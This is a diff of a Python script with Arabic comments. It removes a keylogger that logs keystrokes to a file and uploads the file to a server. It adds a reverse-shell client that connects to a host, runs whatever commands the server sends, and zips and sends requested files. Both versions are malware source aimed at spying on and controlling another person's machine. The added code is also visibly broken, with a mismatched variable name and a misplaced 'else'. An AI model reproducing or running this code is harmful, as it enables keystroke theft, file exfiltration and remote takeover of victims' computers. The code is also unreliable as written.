@@ -1,46 +1,49 @@
 #!/bin/python3
-
 import socket
+import subprocess
 import os
-from pynput import keyboard
+import zipfile
+HOST = "127.0.0.1"
+PORT = 12345
 
-SERVER_DOMAIN = ""   # أو IP
-PORT = 
-
-file_path = "key_log.txt"
-
-def on_press(key):
-    try:
-        with open(file_path, "a") as f:
-            f.write(key.char)  # يكتب الحروف العادية
-    except AttributeError:
-        with open(file_path, "a") as f:
-            f.write(f"[{key}]")  # يكتب المفاتيح الخاصة (مثل Enter, Shift, Ctrl)
-    
-# بدء الاستماع للكيبورد
-with keyboard.Listener(on_press=on_press) as listener:
-    print("Logging started... Press Ctrl+C to stop.")
-    listener.join()
-#........................................
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect((SERVER_DOMAIN, PORT))
+client.connect((HOST, PORT))
 
-# اسم الملف
-filename = os.path.basename(file_path)
-client.sendall(filename.encode())
+while True:
+    data = client.recv(1024).decode()
 
-# حجم الملف
-filesize = os.path.getsize(file_path)
-client.sendall(str(filesize).encode())
+    if data == "EXIT":
+        break
 
-# إرسال الملف
-with open(file_path, "rb") as f:
-    while True:
-        data = f.read(4096)
-        if not data:
-            break
-        client.sendall(data)
+    # تقسيم البروتوكول
+    try:
+        TYPE, CONTENT = data.split("|", 1)
+    except:
+        continue
 
-print("File sent successfully!")
+    # تنفيذ أوامر
+    if TYPE == "CMD":
+        result = subprocess.getoutput(CONTENT)
+        client.sendall(result.encode())
+
+    # إرسال ملف
+    elif TYPE == "GET":
+        if os.path.exists(CONTENT):
+            z_name = CONTENT + ".zip"
+            with zipfile.ZipFile(z_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                zipf.write(CONTENT)             
+        with open(z_name, "rb") as f:
+                while True:
+                    chunk = f.read(1024)
+                    if not chunk:
+                        break
+                    client.sendall(chunk)
+
+        client.sendall(b"EOF")
+        os.remove(zip_name)        else:
+            client.sendall(b"FILE_NOT_FOUND")
+    # استقبال رسالة
+    elif TYPE == "MSG":
+        print(f"[Server Message]: {CONTENT}")
 
 client.close()
